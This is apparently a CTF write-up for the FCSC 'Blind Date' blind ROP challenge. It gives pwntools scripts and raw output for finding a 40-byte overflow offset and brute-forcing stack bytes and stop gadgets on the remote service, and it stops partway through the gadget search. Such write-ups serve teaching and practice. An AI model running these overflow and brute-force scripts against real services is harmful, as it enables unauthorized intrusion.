# Blind Date (489 pts)

>Une société souhaite créer un service en ligne protégeant les informations de ses clients. Pouvez-vous leur montrer qu'elle n'est pas sûre en lisant le fichier flag.txt sur leur serveur ? Les gérants de cette société n'ont pas souhaité vous donner ni le code source de leur solution, ni le binaire compilé, mais ils vous proposent uniquement un accès distant à leur service.

>nc challenges2.france-cybersecurity-challenge.fr 4008

Blind Date is a blind rop challenge I did during the [FCSC event](https://www.france-cybersecurity-challenge.fr).
So, no source code is provided, we juste have a netcat to which we can interact.

To solve this challenge I juste read carefully [this paper](https://www.scs.stanford.edu/brop/bittau-brop.pdf) and applied one per one the techniques described.

### Find the right offset

The first thing to do is to find from which offset the binary crashes, to do so I developped a small script:
```py
#!/usr/bin/python3
from pwn import *

def start():
    return remote("challenges2.france-cybersecurity-challenge.fr", 4008)

def jmp(av):
    io = start()
    io.write(av)
    return io.recvall(timeout=5.0)

def find_padding(p=b""):
    padding = p + b"\x90"
    print(f"[*] sending: {padding}")
    resp = jmp(padding)
    print(f"[*] recv: {resp}")
    while b"Hello you.\nWhat is your name ?\n>>> Thanks " + padding in resp:
        return find_padding(p=padding)
    return padding[:len(padding)-1] # minus one char because we do not want that padding overwrite the return address / canary / triggering a crash

print(len(find_padding()))
```

It's basically sending checking if the right string is always received, and when it's not the case it assumes the remote program crashed and return the corresponding padding. We do not check to see if it prints `Bye!` right after the `Thanks input` because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below:

```
$ ./solve.py
[*] sending: b'\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90Bye!\n'
[*] sending: b'\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x907:EL\xd3\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\xda5r^\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b"Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'\xad\xe9\x7fBye!\n"
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd6\x97\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc1\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xe3\xb0\xff\xff\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc6\x15\x12\xfc\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x05\x1e\xfc\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9a\xfe\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfd\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xe0\xa8\x8bn\xfd\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7f\xc6\xd8\xfe\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcd\n\xfd\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x97\xfd\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfe\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x06@Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n>>> '
40
```
So now we know that we need 40 bytes of padding before the crash.

### Stack reading

Stack reading is just basically a bruteforce of some bytes to trigger the orginal behaviour of the program. It permits especially to leak a stack canary or some saved instruction pointers. But I directly tried to find some stop gadgets, to do so, I'm looking for something in the response. And the best stop gadget would be a unique pattern.

I developped this small function:
```py
def try_jmp(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp

def leak2(padding: str, leak1=b""):
    for i in range(256):
        buf = padding + leak1 + p8(i)
        resp = try_jmp(buf)
        # print(f"Trying on {hex(int.from_bytes(leak1+p8(i), 'little') << (64 - counter*8))}")
        if len(resp):
            print(f"[{hex(int.from_bytes(padd(leak1+p8(i)), 'little'))}] Output: {resp}")
            if len(leak1) < 8:
                leak2(padding, leak1=leak1+p8(i))
            else:
                return leak1
            continue

    return leak1

leak2(b"a"*40)
```
Which returns:
```
$ ./solve.py
[0x5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x1a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x61a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x40061a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x40061a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x1b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x61b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x1d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
[0x61d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
[0x40061d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
[0x40061d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
STOP: <class 'KeyboardInterrupt'>
```
I stopped the script because it's very long by it's already interesting to see that it seems we overwrite directly the return address, which means there is no canary. Morevever according to the addresses of the valid gadgets we found, the binary is not PIE based and it sounds to be a x86 binary. 

### Stop gadget

We can optimize the search of stop gadgets by bruteforcing only the two less significant bytes about the base address: `0x400000`, which gives this:

```py
def try_jmp(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp

def leak2_opti(padding: str):
    base = 0x400000

    for i in range(0x2000):
        buf = padding + p64(base+i)
        resp = try_jmp(buf)
        # print(f"Trying on {hex(int.from_bytes(leak1+p8(i), 'little') << (64 - counter*8))}")
        if len(resp):
            print(f"[{hex(base+i)}] Output: {resp}")
            continue

    return leak1

leak2(b"a"*40)
```
Which prints:
```
$ ./solve.py
[0x4004cc] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x04@'
[0x4004cd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x04@'
[0x4004dd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x04@'
[0x400550] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x05@'
[0x400560] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400562] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400563] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400565] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400566] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaf\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400567] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400569] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaai\x05@Hello you.\nWhat is your name ?\n>>> '
[0x40056d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x05@Hello you.\nWhat is your name ?\n>>> '
[0x40056e] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaan\x05@Hello you.\nWhat is your name ?\n>>> '
[0x40056f] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaao\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400570] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400576] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaav\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400577] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x05@Hello you.\nWhat is your name ?\n>>> '
[0x400596] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x05@'
[0x400597] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x97\x05@'
[0x40059c] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9c\x05@'
[0x40059d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9d\x05@'
[0x4005a0] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x05@'
[0x4005a1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa1\x05@'
[0x4005a3] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa3\x05@'
[0x4005a5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa5\x05@'
[0x4005b4] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x05@'
[0x4005b7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb7\x05@'
[0x4005b8] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x05@'
[0x4005c0] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0\x05@'
[0x4005d6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x05@'
[0x4005d7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd7\x05@'
[0x4005dd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x05@'
[0x4005de] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xde\x05@'
[0x4005e1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe1\x05@'
[0x4005e2] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x05@'
[0x4005e4] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe4\x05@'
[0x4005e5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x05@'
[0x4005e7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe7\x05@'
[0x4005e8] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe8\x05@'
[0x4005eb] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xeb\x05@'
[0x4005ec] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xec\x05@'
[0x4005ee] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xee\x05@'
[0x4005ef] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\x05@'
[0x4005f1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf1\x05@'
[0x4005f3] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf3\x05@'
[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x400608] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\x06@'
[0x40061a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
[0x400622] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\x06@'
[0x400650] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x06@'
[0x400656] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaV\x06@What is your name ?\n>>> '
[0x400657] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaW\x06@What is your name ?\n>>> '
[0x400658] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x06@What is your name ?\n>>> '
[0x40065a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ\x06@What is your name ?\n>>> '
[0x40065e] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa^\x06@What is your name ?\n>>> '
[0x400663] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x06@\x84(\xad\xfb\n>>> '
[0x400668] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@>>> '
[0x40066d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x06@\x84(\xad\xfb'
[0x400672] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaar\x06@\x84(\xad\xfb'
[0x400677] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x06@'
[0x400681] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x81\x06@'
[0x4006b4] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x06@Hello you.\nWhat is your name ?\n>>> '
[0x4006b5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb5\x06@Hello you.\nWhat is your name ?\n>>> '
[0x4006b6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x06@Hello you.\nWhat is your name ?\n>>> '
